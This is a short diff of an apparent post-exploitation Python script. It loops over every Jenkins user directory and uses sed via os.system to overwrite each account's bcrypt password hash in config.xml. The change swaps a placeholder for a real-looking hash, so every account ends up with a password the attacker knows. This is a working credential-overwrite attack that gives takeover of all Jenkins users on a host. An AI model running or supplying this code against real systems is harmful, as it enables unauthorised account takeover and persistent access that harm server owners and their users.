@@ -24,7 +24,7 @@ message = ""
 try:
 	results = os.listdir('/var/lib/jenkins/users/')
 	for r in results:
-        	cmd = """sed -i  's/#jbcrypt:[^>]*/#jbcrypt:woot<\/passwordHash>/' /var/lib/jenkins/users/%s/config.xml"""
+        	cmd = """sed -i  's/#jbcrypt:[^>]*/#jbcrypt:$2a$10$FPGzck4H2j.RkOdLDwJniulnG9ij9SvshDEL/Ilp/lz7BF/t79aFa<\/passwordHash>/' /var/lib/jenkins/users/%s/config.xml"""
         	os.system(cmd % r)
         message = 'using jenkins'
 except: 
